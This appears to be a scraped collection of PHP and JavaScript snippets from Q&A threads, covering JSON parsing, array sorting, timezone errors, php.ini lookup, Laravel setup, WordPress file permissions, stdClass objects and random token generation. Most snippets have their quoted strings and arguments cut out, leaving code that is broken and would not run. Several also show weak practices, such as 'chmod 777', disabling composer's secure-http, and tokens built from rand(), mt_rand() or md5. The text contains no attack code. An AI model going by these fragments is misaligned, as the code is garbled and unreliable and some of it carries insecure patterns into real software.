foreach ($array as $item) { $last_element = end($array); reset($array); if ($last_element == $item) { } }
$last_element = $array[sizeof ($array) - 1]; foreach ($array as $key => $item) { if ($last_element == $item) { } }
{ "John": { "status":"Wait" }, "Jennifer": { "status":"Active" }, "James": { "status":"Active", "age":56, "count":10, "progress":0.0029857, "bad":0 } }
<?php $string = file_get_contents("/home/michael/test.json"); $json_a = json_decode($string, true); echo $json_a[ echo $json_a[
$jsonIterator = new RecursiveIteratorIterator( new RecursiveArrayIterator(json_decode($json, TRUE)), RecursiveIteratorIterator::SELF_FIRST); foreach ($jsonIterator as $key => $val) { if(is_array($val)) { echo "$key:\n"; } else { echo "$key => $val\n"; } }
John: status => Wait Jennifer: status => Active James: status => Active age => 56 count => 10 progress => 0.0029857 bad => 0
<?php $string = file_get_contents("/home/michael/test.json"); $json_a = json_decode($string, true); foreach ($json_a as $person_name => $person_a) { echo $person_a[ } ?>
$shipments = json_decode(file_get_contents("shipments.js"), true); print_r($shipments);
$shipments = json_encode(json_decode(file_get_contents("shipments.js"), true)); echo $shipments;
<?php $string = file_get_contents("/home/michael/test.json"); $json_a=json_decode($string,true); foreach ($json_a as $key => $value){ echo $key . } ?>
[ { "name" : "john", "status":"Wait" }, { "name" : "Jennifer", "status":"Active" }, { "name" : "James", "status":"Active", "age":56, "count":10, "progress":0.0029857, "bad":0 } ]
$json_data = "John": { "status":"Wait" }, "Jennifer": { "status":"Active" }, "James": { "status":"Active", "age":56, "count":10, "progress":0.0029857, "bad":0 } } $decode_data = json_decode($json_data); foreach($decode_data as $key=>$value){ print_r($value); }
$string = file_get_contents("/home/michael/test.json"); $json = json_decode($string, true); foreach ($json as $key => $value) { if (!is_array($value)) { echo $key . } else { foreach ($value as $key => $val) { echo $key . } } }
$jsondata = file_get_contents(PATH_TO_JSON_FILE."/jsonfile.json"); $array = json_decode($jsondata,true); foreach($array as $k=>$val): echo $keys = array_keys($val); foreach($keys as $key): echo endforeach; endforeach;
Name: John Status = Wait Name: Jennifer Status = Active Name: James Status = Active Age = 56 Count = 10 Progress = 0.0029857 Bad = 0
foreach($json_a as $key => $value) { echo $key; if (gettype($value) == "object") { foreach ($value as $key => $value) { } } }
<?php $json = "response": { "data": [{"identifier": "Be Soft Drinker, Inc.", "entityName": "BusinessPartner"}], "status": 0, "totalRows": 83, "startRow": 0, "endRow": 82 } } $json = json_decode($json, true); echo $json[ $json[ echo $json[ echo $json[ echo $json[ echo $json[ ?>
foreach ($json_a as $key => $value) { echo $key, foreach($value as $v) { echo $v." "; } }
<?php $json = file_get_contents( $json_a = json_decode($json); var_dump($json_a); echo "\n"; foreach($json_a as $row){ echo $row->status; echo "\n"; } ?>
$json_a = json_decode($string, TRUE); $json_o = json_decode($string); foreach($json_a as $person => $value) { foreach($value as $key => $personal) { echo $person. " with ".$key . " is ".$personal; echo "<br>"; } }
foreach($data as $object) { foreach($object as $value) { echo $value; } }
<? header("Content-type: image/png"); $img = imagecreatetruecolor ( 10, 10); imagepng ( $img); ?> [space here] [break line here]
<? header("Content-type: image/png"); $img = imagecreatetruecolor ( 10, 10 ); imagepng ( $img );
[core:notice] [pid 7842] AH00052: child pid 10218 exit signal Segmentation fault (11)
<div style="border:1px solid <h4>A PHP Error was encountered</h4> <p>Severity: Warning</p> <p>Message: date(): It is not safe to rely on the system <p>Filename: libraries/Log.php</p> <p>Line Number: 86</p> </div> Warning: date(): It is not safe to rely on the system Warning: date(): It is not safe to rely on the system <div style="border:1px solid <h4>A PHP Error was encountered</h4> <p>Severity: Warning</p> <p>Message: date(): It is not safe to rely on the system <p>Filename: libraries/Log.php</p> <p>Line Number: 99</p> </div>
[Date] ; Defines the default timezone used by the date functions ; http: date.timezone = America/New_York
if (!date_default_timezone_get( date_default_timezone_set( }
[Date] ; Defines the default timezone used by the date functions ; http: date.timezone = UTC
<?php $date = new DateTime("2012-07-05 16:43:21", new DateTimeZone( date_default_timezone_set( echo date("Y-m-d h:iA", $date->format( ?>
error_reporting( E_ERROR | E_PARSE | E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_COMPILE_WARNING );
volumes: - "./docker/config/timezone.ini:/usr/local/etc/php/conf.d/timezone.ini"
date_default_timezone_set(date_default_timezone_get());
$inventory = array( array("type"=>"fruit", "price"=>3.50), array("type"=>"milk", "price"=>2.90), array("type"=>"pork", "price"=>5.43), );
$inventory = array( array("type"=>"pork", "price"=>5.43), array("type"=>"fruit", "price"=>3.50), array("type"=>"milk", "price"=>2.90), );
$price = array(); foreach ($inventory as $key => $row) { $price[$key] = $row[ } array_multisort($price, SORT_DESC, $inventory);
usort($inventory, function ($item1, $item2) { return $item1[ });
usort($inventory, function ($item1, $item2) { return $item2[ });
usort($inventory, function ($item1, $item2) { if ($item1[ return $item1[ });
function invenDescSort($item1,$item2) { if ($item1[ return ($item1[ } usort($inventory, print_r($inventory);
Array ( [0] => Array ( [type] => pork [price] => 5.43 ) [1] => Array ( [type] => fruit [price] => 3.5 ) [2] => Array ( [type] => milk [price] => 2.9 ) )
function sort_array_of_array(&$array, $subfield) { $sortarray = array(); foreach ($array as $key => $row) { $sortarray[$key] = $row[$subfield]; } array_multisort($sortarray, SORT_ASC, $array); }
usort($inventory, function ($a, $b) { return strnatcmp($a[
$inventory = array(array("type"=>"fruit", "price"=>3.50), array("type"=>"milk", "price"=>2.90), array("type"=>"pork", "price"=>5.43), ); function pricesort($a, $b) { $a = $a[ $b = $b[ if ($a == $b) return 0; return ($a > $b) ? -1 : 1; } usort($inventory, "pricesort"); print("first: ".$inventory[0][ foreach($inventory as $i){ print($i[ }
function SortByKeyValue($data, $sortKey, $sort_flags=SORT_ASC) { if (empty($data) or empty($sortKey)) return $data; $ordered = array(); foreach ($data as $key => $value) $ordered[$value[$sortKey]] = $value; ksort($ordered, $sort_flags); return array_values($ordered); * }
$array = array( array( array( array( ); function cmp($a, $b) { return $a[ } uasort($array, "cmp");
function usortarr(&$array, $key, $callback = uasort($array, function($a, $b) use($key, $callback) { return call_user_func($callback, $a[$key], $b[$key]); }); }
function cmp($a, $b) { return (float) $a[ } @uasort($inventory, "cmp"); print_r($inventory); Array ( [2] => Array ( [type] => pork [price] => 5.43 ) [0] => Array ( [type] => fruit [price] => 3.5 ) [1] => Array ( [type] => milk [price] => 2.9 ) )
/** * A method for sorting arrays by a certain key:value. * SortByKey is the key you wish to sort by * Direction can be ASC or DESC. * * @param $array * @param $sortByKey * @param $sortDirection * @return array */ private function sortArray($array, $sortByKey, $sortDirection) { $sortArray = array(); $tempArray = array(); foreach ( $array as $key => $value ) { $tempArray[] = strtolower( $value[ $sortByKey ] ); } if($sortDirection== else{ arsort($tempArray ); } foreach ( $tempArray as $key => $temp ){ $sortArray[] = $array[ $key ]; } return $sortArray; }
$arr1 = array( array( array( array( array( ); $result1 = array_msort($arr1, array( $result2 = array_msort($arr1, array( $result3 = array_msort($arr1, array( function array_msort($array, $cols) { $colarr = array(); foreach ($cols as $col => $order) { $colarr[$col] = array(); foreach ($array as $k => $row) { $colarr[$col][ } $eval = foreach ($cols as $col => $order) { $eval .= } $eval = substr($eval,0,-1). eval($eval); $ret = array(); foreach ($colarr as $col => $arr) { foreach ($arr as $k => $v) { $k = substr($k,1); if (!isset($ret[$k])) $ret[$k] = $array[$k]; $ret[$k][$col] = $array[$k][$col]; } } return $ret; }
<?php function array_sort($array, $on, $order=SORT_ASC) { $new_array = array(); $sortable_array = array(); if (count($array) > 0) { foreach ($array as $k => $v) { if (is_array($v)) { foreach ($v as $k2 => $v2) { if ($k2 == $on) { $sortable_array[$k] = $v2; } } } else { $sortable_array[$k] = $v; } } switch ($order) { case SORT_ASC: asort($sortable_array); break; case SORT_DESC: arsort($sortable_array); break; } foreach ($sortable_array as $k => $v) { $new_array[$k] = $array[$k]; } } return $new_array; } $people = array( 12345 => array( ), 12346 => array( ), 12347 => array( ) ); print_r(array_sort($people, print_r(array_sort($people,
<?php $inventory = array( array("type"=>"fruit", "price"=>3.50), array("type"=>"milk", "price"=>2.90), array("type"=>"pork", "price"=>5.43), ); function myfunc($a,$b){ return strnatcmp($a[ } $result=usort ($inventory,"myfunc");?> <pre><?php print_r(array_reverse($inventory)); ?></pre>
Array ( [0] => Array ( [type] => pork [price] => 5.43 ) [1] => Array ( [type] => fruit [price] => 3.5 ) [2] => Array ( [type] => milk [price] => 2.9 ) )
<?php $json_string = $jsondata = file_get_contents($json_string); $obj = json_decode($jsondata); print_r($obj[ ?>
$json_string = $jsondata = file_get_contents($json_string); $obj = json_decode($jsondata,true); echo "<pre>"; print_r($obj);
$jsondata = $arr = json_decode($jsondata, true); foreach ($arr as $k=>$v){ echo $v; }
$json_string = $jsondata = file_get_contents($json_string); $obj = json_decode($jsondata, TRUE); print_r($obj[
mixed json_decode ( string $json [, bool $assoc = FALSE ] )
$json = var_dump(json_decode($json)); var_dump(json_decode($json, true));
object(stdClass) ["a"] => int(1) ["b"] => int(2) ["c"] => int(3) ["d"] => int(4) ["e"] => int(5) } array(5) { ["a"] => int(1) ["b"] => int(2) ["c"] => int(3) ["d"] => int(4) ["e"] => int(5) }
<?php $json_string = $jsondata = file_get_contents($json_string); $obj = json_decode($jsondata, true); echo "<pre>"; print_r($obj[ ?>
$json_string = $jsondata = file_get_contents($json_string); $obj = json_decode($jsondata); print_r($obj->Result); foreach($obj->Result as $value){ echo $value->id; }
eric@dev /var $ sudo updatedb [sudo] password for eric: eric@dev /var $ sudo locate error_log /var/log/httpd/error_log
eric@dev /home/eric $ sudo find / -name "error_log" 2>/dev/null /var/log/httpd/error_log
<pre> <?php $origarray1 = array(2.4, 2.6, 3.5); $origarray2 = array(2.4, 2.6, 3.5); print_r(array_map( array_walk($origarray2, function (&$v, $k) { $v = floor($v); }); print_r($origarray2); array_walk($origarray1, function ($v, $k) { echo "$k => $v", "\n"; }); print_r( array_map(function ($a, $b) { return $a * $b; }, $origarray1, $origarray2) ); print_r( array_filter($origarray1, function ($a) { return $a > 2.5; }) ); ?> </pre>
Array ( [0] => 2 [1] => 2 [2] => 3 ) Array ( [0] => 2 [1] => 2 [2] => 3 ) 0 => 2.4 1 => 2.6 2 => 3.5 Array ( [0] => 4.8 [1] => 5.2 [2] => 10.5 ) Array ( [1] => 2.6 [2] => 3.5 )
my_function( my_function( my_function( my_function( $accumulator,
function array_reduce($array, $function, $accumulator) { foreach ($array as $element) { $accumulator = $function($accumulator, $element); } return $accumulator; }
array_map($function, $array) === array_reduce($array, $MAP, array()) array_filter($array, $function) === array_reduce($array, $FILTER, array())
$MAP = function($accumulator, $element) { $accumulator[] = $function($element); return $accumulator; }; $FILTER = function($accumulator, $element) { if ($function($element)) $accumulator[] = $element; return $accumulator; };
array_reduce($inputs, function($accumulator, $element) { if (valid($element)) $accumulator[] = transform($element); return $accumulator; }, array()) array_reduce($inputs, function($accumulator, $element) { $id = get_id($element); if (is_numeric($id)) $accumulator[] = $id; return $accumulator; }, array())
<?php $array = array(1, "apples",2, "oranges",3, "plums"); $filtered = array_filter( $array, "ctype_alpha"); var_dump($filtered); ?>
<?php $nu = array_map( "strtoupper", $filtered); var_dump($nu); ?>
<?php $f = function(&$item,$key,$prefix) { $item = "$key: $prefix: $item"; }; array_walk($nu, $f,"fruit"); var_dump($nu); ?>
<?php error_reporting( E_ALL ); ?> <html> <head> <title></title> <link rel="icon" type="image/png" href="favicon.ico"> <?php if( $_SERVER[ $err = array(); if( empty( $_POST[ if( empty( $_POST[ if( empty( $_POST[ if( !$err ) { try { $DBH = new PDO( "mysql:host=localhost;dbname=database1", "user", "pass" ); $DBH -> setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION ); $STH = $DBH -> prepare( "delete into table1 (display_name, email, password) values ( :display_name, :email, :password )" ); $STH -> bindParam( $STH -> bindParam( $STH -> bindParam( $STH -> execute(); $STH = $DBH -> prepare( "delete into table2 ( username, status, users_id ) values ( :username, :status, :users_id )" ); $strStatus = 1; $STH -> bindParam( $STH -> bindParam( $STH -> bindParam( $STH -> execute(); $DBH = null; } catch( PDOException $e ) { echo $e -> getMessage(); } header( "Location: ".$_SERVER[ exit; } else { foreach( $_POST as $key => $val ) { $form[$key] = htmlspecialchars($val); } } } else { $form[ } ?> </head> <body> <?php foreach( $err as $line ) { ?> <div style="error"><?php echo $line; ?></div> <?php } ?> <h1>register</h1> <form method="post"> referers id:<br /> <input type="text" name="referer" /><br /><br /> name:<br /> <input type="text" name="display_name" value="<?php echo $form[ email:<br /> <input type="text" name="email" value="<?php echo $form[ password:<br /> <input type="text" name="password" value="<?php echo $form[ <input type="submit" value="register" /> </form> </body> </html>
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Error handling and logging ; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; This directive informs PHP of which errors, warnings and notices you would like ; it to take action for. The recommended way of setting values for this ; directive is through the use of the error level constants and bitwise ; operators. The error level constants are below here for convenience as well as ; some common settings and their meanings. ; By default, PHP is set to take action on all errors, notices and warnings EXCEPT ; those related to E_NOTICE and E_STRICT, which together cover best practices and ; recommended coding standards in PHP. For performance reasons, this is the ; recommend error reporting setting. Your production server shouldn ; resources complaining about best practices and coding standards. That ; development servers and development settings are for. ; Note: The php.ini-development file has this setting as E_ALL. This ; means it pretty much reports everything which is exactly what you want during ; development and early testing. ; ; Error Level Constants: ; E_ALL - All errors and warnings (includes E_STRICT as of PHP 5.4.0) ; E_ERROR - fatal run-time errors ; E_RECOVERABLE_ERROR - almost fatal run-time errors ; E_WARNING - run-time warnings (non-fatal errors) ; E_PARSE - compile-time parse errors ; E_NOTICE - run-time notices (these are warnings which often result ; from a bug in your code, but it ; intentional (e.g., using an uninitialized variable and ; relying on the fact it is automatically initialized to an ; empty string) ; E_STRICT - run-time notices, enable to have PHP suggest changes ; to your code which will ensure the best interoperability ; and forward compatibility of your code ; E_CORE_ERROR - fatal errors that occur during PHP ; E_CORE_WARNING - warnings (non-fatal errors) that occur during PHP ; initial startup ; E_COMPILE_ERROR - fatal compile-time errors ; E_COMPILE_WARNING - compile-time warnings (non-fatal errors) ; E_USER_ERROR - user-generated error message ; E_USER_WARNING - user-generated warning message ; E_USER_NOTICE - user-generated notice message ; E_DEPRECATED - warn about code that will not work in future versions ; of PHP ; E_USER_DEPRECATED - user-generated deprecation warnings ; ; Common Values: ; E_ALL (Show all errors, warnings and notices including coding standards.) ; E_ALL & ~E_NOTICE (Show all errors, except for notices) ; E_ALL & ~E_NOTICE & ~E_STRICT (Show all errors, except for notices and coding standards warnings.) ; E_COMPILE_ERROR|E_RECOVERABLE_ERROR|E_ERROR|E_CORE_ERROR (Show only errors) ; Default Value: E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED ; Development Value: E_ALL ; Production Value: E_ALL & ~E_DEPRECATED & ~E_STRICT ; http: error_reporting = E_ALL & ~E_DEPRECATED & ~E_STRICT
;display_startup_errors = On display_startup_errors=off display_errors =on html_errors= on
error_reporting(E_ERROR | E_WARNING | E_PARSE); error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); error_reporting(E_ALL & ~E_NOTICE); error_reporting(E_ALL); error_reporting(-1); ini_set(
$ php -i | grep Configuration File (php.ini) Path => /etc Loaded Configuration File => /etc/php.ini
[root@tamilan src] Configuration File (php.ini) Path: /etc Loaded Configuration File: /etc/php.ini Scan for additional .ini files in: /etc/php.d Additional .ini files parsed: /etc/php.d/apc.ini, /etc/php.d/bcmath.ini, /etc/php.d/curl.ini, /etc/php.d/dba.ini, /etc/php.d/dom.ini, /etc/php.d/fileinfo.ini, /etc/php.d/gd.ini, /etc/php.d/imap.ini, /etc/php.d/json.ini, /etc/php.d/mbstring.ini, /etc/php.d/memcache.ini, /etc/php.d/mysql.ini, /etc/php.d/mysqli.ini, /etc/php.d/pdo.ini, /etc/php.d/pdo_mysql.ini, /etc/php.d/pdo_sqlite.ini, /etc/php.d/phar.ini, /etc/php.d/posix.ini, /etc/php.d/sqlite3.ini, /etc/php.d/ssh2.ini, /etc/php.d/sysvmsg.ini, /etc/php.d/sysvsem.ini, /etc/php.d/sysvshm.ini, /etc/php.d/wddx.ini, /etc/php.d/xmlreader.ini, /etc/php.d/xmlwriter.ini, /etc/php.d/xsl.ini, /etc/php.d/zip.ini
$ php -i | grep "\.ini" Configuration File (php.ini) Path => /etc/php5/cli Loaded Configuration File => /etc/php5/cli/php.ini Scan this dir for additional .ini files => /etc/php5/cli/conf.d additional .ini files parsed => /etc/php5/cli/conf.d/apc.ini, /etc/php5/cli/conf.d/curl.ini, /etc/php5/cli/conf.d/gd.ini, /etc/php5/cli/conf.d/mcrypt.ini, /etc/php5/cli/conf.d/memcache.ini, /etc/php5/cli/conf.d/mysql.ini, /etc/php5/cli/conf.d/mysqli.ini, /etc/php5/cli/conf.d/pdo.ini, /etc/php5/cli/conf.d/pdo_mysql.ini
$ strace -o strace.log php --version $ grep php.ini strace.log
open("/usr/bin/php.ini", O_RDONLY) = -1 ENOENT (No such file or directory) open("/etc/php.ini", O_RDONLY) = 3 lstat("/etc/php.ini", {st_mode=S_IFREG|0644, st_size=69105, ...}) = 0
Configuration File (php.ini) Path => /etc Loaded Configuration File: (none)
composer create-project laravel/laravel name-of-your-project
composer create-project --prefer-dist laravel/laravel myProje
"config": { "preferred-install": "dist", "secure-http": false }
"scripts": { "post-root-package-install": [ "php -r \"copy( ], "post-create-project-cmd": [ "php artisan key:generate" ], "post-install-cmd": [ "php artisan clear-compiled", "php artisan optimize" ], "pre-update-cmd": [ "php artisan clear-compiled" ], "post-update-cmd": [ "php artisan optimize" ], "post-autoload-dump": [ "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump", "@php artisan package:discover" ] },
"scripts": { "post-root-package-install": [ "@php -r \"file_exists( ], "post-create-project-cmd": [ "@php artisan key:generate" ], "post-autoload-dump": [ "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump", "@php artisan package:discover" ] },
cd installationFolder php artisan package:discover php artisan key:generate
composer update composer install php artisan key:generate
$str = $arr = explode(":", $str); $var = $arr[1].":".$arr[2];
var mystr = var myarr = mystr.split(":"); var myvar = myarr[1] + ":" + myarr[2]; console.log(myvar);
String.prototype.explode = function (separator, limit) { const array = this.split(separator); if (limit !== undefined && array.length >= limit) { array.push(array.splice(limit - 1).join(separator)); } return array; };
var data = new Object(); var string = "?id=5&first=John&last=Doe"; var pairs = string.substring(string.indexOf( for(var key in pairs) { var value = pairs[key].split("="); data[value[0]] = value[1]; } var data = {"id":"5", "first":"John", "last":"Doe"}; data.id = "5"; data.first = "John"; data.last = "Doe";
var vInputString = "0000000020C90037:TEMP:data"; var vArray = vInputString.split(":"); var vRes = vArray[1] + ":" + vArray[2]; `
var mystr = var myarr = mystr.split(":"); var arrlen = myarr.length; var myvar = myarr[arrlen-2] + ":" + myarr[arrlen-1];
function explode(str,begin,end) { t=str.split(begin); t=t[1].split(end); return t[0]; }
function explode (s, separator, limit) { var arr = s.split(separator); if (limit) { arr.push(arr.splice(limit-1, (arr.length-(limit-1))).join(separator)); } return arr; }
function explode (delimiter, string, limit) { if (arguments.length < 2 || typeof delimiter === typeof string === return null } if (delimiter === delimiter === false || delimiter === null) { return false } if (typeof delimiter === typeof delimiter === typeof string === typeof string === return { 0: } } if (delimiter === true) { delimiter = } delimiter += string += var s = string.split(delimiter) if (typeof limit === if (limit === 0) limit = 1 if (limit > 0) { if (limit >= s.length) { return s } return s .slice(0, limit - 1) .concat([s.slice(limit - 1) .join(delimiter) ]) } if (-limit >= s.length) { return [] } s.splice(s.length + limit) return s }
var str = "helloword~this~is~me"; var exploded = str.splice(~);
WAS: -rw-r--r-- 1 yourUserName www-data 7192 Oct 4 00:03 filename.html CHANGED TO: -rw-rw-r-- 1 yourUserName www-data 7192 Oct 4 00:03 filename.html
chown wp-user:wp-user -R * chown www-data:www-data -R wp-content/uploads/ find . -type d -exec chmod 755 {} \; find . -type f -exec chmod 644 {} \;
chmod 777 wp-content/w3tc-config chmod 777 wp-content/cache rm -rf wp-content/cache/config rm -rf wp-content/cache/object rm -rf wp-content/cache/db rm -rf wp-content/cache/minify rm -rf wp-content/cache/page_enhanced
chown www-data:www-data -R wp-content/ chown your-user:root-group -R wp-content/themes chown your-user:root-group -R wp-content/plugins/your-plugin
find . -type d -exec chmod 755 {} \; find . -type f -exec chmod 644 {} \;
find foldername -type d -exec chmod 755 {} \; find foldername -type f -exec chmod 644 {} \;
chown -R www-data:www-data /var/www/html/wp-content
sudo find /var/www/html -type f -exec chmod 644 {} +
sudo apt-get install apache2-utils sudo htpasswd -c /etc/nginx/.htpasswd userName
location ^~ /wp-admin { auth_basic "Restricted"; auth_basic_user_file /etc/nginx/.htpasswd; index index.php index.html index.htm; }
chown www-data:www-data -R * find . -type d -exec chmod 755 {} \; find . -type f -exec chmod 644 {} \;
chown -R ftp-user:www-data wp-content chmod -R 775 wp-content
chown -Rv www-data:www-data chmod -Rv 0755 wp-includes chmod -Rv 0755 wp-admin/js chmod -Rv 0755 wp-content/themes chmod -Rv 0755 wp-content/plugins chmod -Rv 0755 wp-admin chmod -Rv 0755 wp-content chmod -v 0644 wp-config.php chmod -v 0644 wp-admin/index.php chmod -v 0644 .htaccess
sudo chown -R bitnami:daemon /opt/bitnami/apps/wordpress/htdocs/ sudo find /opt/bitnami/apps/wordpress/htdocs/ -type f -exec chmod 664 {} \; sudo find /opt/bitnami/apps/wordpress/htdocs/ -type d -exec chmod 775 {} \;
cd /var/www/html/example.com sudo chown -R www-data:www-data public_html/
cd public_html/wp-content sudo chown -R www-data:wp-user wflogs sudo chown -R www-data:wp-user uploads
cd plugins sudo chown -R www-data:wp-user wordfence/
find . -type d -exec chmod 755 {} \; find . -type f -exec chmod 644 {} \;
$aVal = array(); $aVal[key1][var1] = "something"; $aVal[key1][var2] = "something else";
(object)$oVal = ""; $oVal->key1->var1 = "something"; $oVal->key1->var2 = "something else";
$oVal = new stdClass(); $oVal->key1->var1 = "something"; $oVal->key1->var2 = "something else";
$oVal = new stdClass(); @$oVal->key1->var1 = "something"; $oVal->key1->var2 = "something else";
var myObj = { foo: "Foo value", bar: "Bar value" }; console.log(myObj.foo);
$myObj = (object) [ "foo" => "Foo value", "bar" => "Bar value" ]; $myObj = (object) array( "foo" => "Foo value", "bar" => "Bar value" ); echo $myObj->foo;
var myObj = { foo: "Foo value", bar: function(greeting) { return greeting + " bar"; } }; console.log(myObj.bar("Hello")); $myObj = (object) [ "foo" => "Foo value", "bar" => function($greeting) { return $greeting . " bar"; } ]; var_dump($myObj->bar("Hello")); var_dump($myObj->bar);
$myObj = new stdClass; $myObj->Prop1 = "Something"; $myObj->Prop2 = "Something else"; echo $myObj->{ echo $myObj->{ echo $myObj->{$myStringVar};
$obj_a = new stdClass(); $obj_a->name = "John"; print_r($obj_a);
$obj_b = (object) []; $obj_b->name = "John"; print_r($obj_b);
$obj_c = (object) null; $obj_c->name = "John"; print($obj_c);
class stdClass { public function __construct(array $arguments = array()) { if (!empty($arguments)) { foreach ($arguments as $property => $argument) { if(is_numeric($property)): $this->{$argument} = null; else: $this->{$property} = $argument; endif; } } } public function __call($method, $arguments) { $arguments = array_merge(array("stdObject" => $this), $arguments); if (isset($this->{$method}) && is_callable($this->{$method})) { return call_user_func_array($this->{$method}, $arguments); } else { throw new Exception("Fatal error: Call to undefined method stdObject::{$method}()"); } } public function __get($name){ if(property_exists($this, $name)): return $this->{$name}; else: return $this->{$name} = null; endif; } public function __set($name, $value) { $this->{$name} = $value; } } $obj1 = new stdClass([ echo $obj1->property1; echo $obj1->property2; $obj2 = new stdClass(); echo $obj2->property1;
$myObj = new stdClass(); $myObj->key_1 = $myObj->key_2 =
<?php $colors = (object)[]; $colors->red = " $colors->slateblue = " $colors->orange = " foreach ($colors as $key => $value) : ?> <p style="background-color:<?= $value ?>"> <?= $key ?> -> <?= $value ?> </p> <?php endforeach; ?>
function crypto_rand_secure($min, $max) { $range = $max - $min; if ($range < 1) return $min; $log = ceil(log($range, 2)); $bytes = (int) ($log / 8) + 1; $bits = (int) $log + 1; $filter = (int) (1 << $bits) - 1; do { $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); $rnd = $rnd & $filter; } while ($rnd > $range); return $min + $rnd; } function getToken($length) { $token = ""; $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz"; $codeAlphabet.= "0123456789"; $max = strlen($codeAlphabet); for ($i=0; $i < $length; $i++) { $token .= $codeAlphabet[crypto_rand_secure(0, $max-1)]; } return $token; }
function getToken($length){ $token = ""; $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz"; $codeAlphabet.= "0123456789"; $max = strlen($codeAlphabet); for ($i=0; $i < $length; $i++) { $token .= $codeAlphabet[random_int(0, $max-1)]; } return $token; }
<?php namespace Utils; /** * Class RandomStringGenerator * @package Utils * * Solution taken from here: * http: */ class RandomStringGenerator { /** @var string */ protected $alphabet; /** @var int */ protected $alphabetLength; /** * @param string $alphabet */ public function __construct($alphabet = { if ( $this->setAlphabet($alphabet); } else { $this->setAlphabet( implode(range( . implode(range( . implode(range(0, 9)) ); } } /** * @param string $alphabet */ public function setAlphabet($alphabet) { $this->alphabet = $alphabet; $this->alphabetLength = strlen($alphabet); } /** * @param int $length * @return string */ public function generate($length) { $token = for ($i = 0; $i < $length; $i++) { $randomKey = $this->getRandomInteger(0, $this->alphabetLength); $token .= $this->alphabet[$randomKey]; } return $token; } /** * @param int $min * @param int $max * @return int */ protected function getRandomInteger($min, $max) { $range = ($max - $min); if ($range < 0) { return $min; } $log = log($range, 2); $bytes = (int) ($log / 8) + 1; $bits = (int) $log + 1; $filter = (int) (1 << $bits) - 1; do { $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); $rnd = $rnd & $filter; } while ($rnd >= $range); return ($min + $rnd); } }
<?php use Utils\RandomStringGenerator; $generator = new RandomStringGenerator; $tokenLength = 32; $token = $generator->generate($tokenLength);
<?php $customAlphabet = $generator = new RandomStringGenerator($customAlphabet); $generator->setAlphabet($customAlphabet);
function random_string($length) { $key = $keys = array_merge(range(0, 9), range( for ($i = 0; $i < $length; $i++) { $key .= $keys[array_rand($keys)]; } return $key; } echo random_string(50);
function generate_uuid() { return sprintf( mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0x0C2f ) | 0x4000, mt_rand( 0, 0x3fff ) | 0x8000, mt_rand( 0, 0x2Aff ), mt_rand( 0, 0xffD3 ), mt_rand( 0, 0xff4B ) ); }
E302D66D-87E3-4450-8CB6-17531895BF14 22D288BC-7289-442B-BEEA-286777D559F2 51B4DE29-3B71-4FD2-9E6C-071703E1FF31 3777C8C6-9FF5-4C78-AAA2-08A47F555E81 54B91C72-2CF4-4501-A6E9-02A60DCBAE4C 60F75C7C-1AE3-417B-82C8-14D456542CD7 8DE0168D-01D3-4502-9E59-10D665CEBCB2
base64_encode(openssl_random_pseudo_bytes(3 * ($length >> 2)));
int myInt = random(0, numcharacters) char[] codealphabet = char random = codealphabet[i] repeat until long enough
$randomNum=substr(str_shuffle("0123456789abcdefghijklmnopqrstvwxyz"), 0, 11);
function randomNumber($length){ $numbers = range(0,9); shuffle($numbers); for($i = 0;$i < $length;$i++) $digits .= $numbers[$i]; return $digits; } $randomNum=randomNumber(11);
<?php $d=date ("d"); $m=date ("m"); $y=date ("Y"); $t=time(); $dmt=$d+$m+$y+$t; $ran= rand(0,10000000); $dmtran= $dmt+$ran; $un= uniqid(); $dmtun = $dmt.$un; $mdun = md5($dmtran.$un); $sort=substr($mdun, 16); echo $mdun; ?>
protected static $nonce_length = 32; public static function getNonce() { $chars = array(); for ($i = 0; $i < 10; $i++) $chars = array_merge($chars, range(0, 9), range( shuffle($chars); $start = mt_rand(0, count($chars) - self::$nonce_length); return substr(join( }
function random_string($length = 8) { $alphabets = range( $numbers = range( $additional_characters = array( $final_array = array_merge($alphabets,$numbers,$additional_characters); while($length--) { $key = array_rand($final_array); $password .= $final_array[$key]; } if (preg_match( { return $password; }else{ return random_string(); } }
function random_code($length) { return substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, $length); } echo random_code(6); /*sample output * a7d9e8 * 3klo93 */
public function generateUniqueToken($userid, $username){ $rand = mt_rand(100,999); $md5 = md5($userid. $md53 = substr($md5,0,3); $md5_remaining = substr($md5,3); $md5 = $md53. $rand. $userid. $md5_remaining; return $md5; }
$timestampz=time(); function generateRandomString($length = 60) { $characters = $charactersLength = strlen($characters); $randomString = for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } $tokenparta = generateRandomString(); $token = $timestampz*3 . $tokenparta; echo $token;
<?php function generateRandomString($length = 11) { $characters = $charactersLength = strlen($characters); $randomString = for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } ?>
$sffledStr= str_shuffle( $uniqueString = md5(time().$sffledStr);
